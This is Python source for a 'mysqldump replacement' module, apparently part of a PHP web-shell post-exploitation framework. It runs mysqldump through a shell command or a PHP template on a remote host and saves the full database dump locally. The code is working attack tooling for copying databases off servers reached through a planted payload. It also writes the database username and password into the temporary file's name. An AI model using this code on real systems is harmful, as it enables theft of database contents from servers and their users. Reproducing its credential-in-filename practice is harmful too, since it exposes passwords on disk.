from core.vectors import PhpTemplate, ShellCmd
from core.module import Module
from core.loggers import log
from core import modules
from core import messages
import tempfile
import os

class Dump(Module):

    """Mysqldump replacement."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
            ShellCmd(
              payload = "mysqldump -h ${host} -u${user} -p${passwd} ${db} ${table} --single-transaction",
              name = 'mysqldump_sh'
            ),
            PhpTemplate(
              payload_path = os.path.join(self.folder, 'mysqldump.tpl'),
              name = 'mysqldump_php',
            )
            ]
        )

        self.register_arguments([
          { 'name' : 'db', 'help' : 'Db to dump' },
          { 'name' : 'user', 'help' : 'SQL username' },
          # Using passwd instead of pass to avoid rendering the `pass` keyword
          { 'name' : 'passwd', 'help' : 'SQL password' },
          { 'name' : '-dbms', 'help' : 'Db type. Vector \'mysqldump_sh\' supports only \'mysql\'.', 'choices' : ('mysql', 'pgsql', 'sqlite', 'dblib'), 'default' : 'mysql' },
          { 'name' : '-host', 'help' : 'Db host or host:port', 'nargs' : '?', 'default' : '127.0.0.1' },
          { 'name' : '-lpath', 'help' : 'Dump to local path (default: temporary file)' },
          { 'name' : '-vector', 'choices' : self.vectors.get_names(), 'default' : 'mysqldump_php' }
        ])

    def run(self, args):

        args['table'] = args.get('table', '')

        if args['vector'] == 'mysqldump_sh' and args['dbms'] != 'mysql':
            log.warn(messages.module.vector_s_not_support_arg_s_s % (
                            args['vector'],
                            'dbms',
                            args['dbms']
                        )
                    )
            return

        vector_name, result = self.vectors.find_first_result(
            names = [ args.get('vector') ],
            format_args = args,
            condition = lambda r: r and '-- Dumping data for table' in r
        )

        if not vector_name:
            log.warn(messages.module_sql_dump.sql_dump_failed_check_credentials)
            return

        # Get a temporary file name if not specified
        lpath = args.get('lpath')
        if not lpath:
            temp_file = tempfile.NamedTemporaryFile(
                suffix = '_%s_%s_%s_%s.sqldump' % (
                    args['user'], args['passwd'], args['host'], args['db']
                ),
            delete = False
            )
            lpath = temp_file.name

        try:
            open(lpath, 'w').write(result)
        except Exception as e:
            log.warn(
                messages.generic.error_creating_file_s_s % (lpath, e)
            )
            return

        log.info(messages.module_sql_dump.sql_dump_saved_s % lpath)
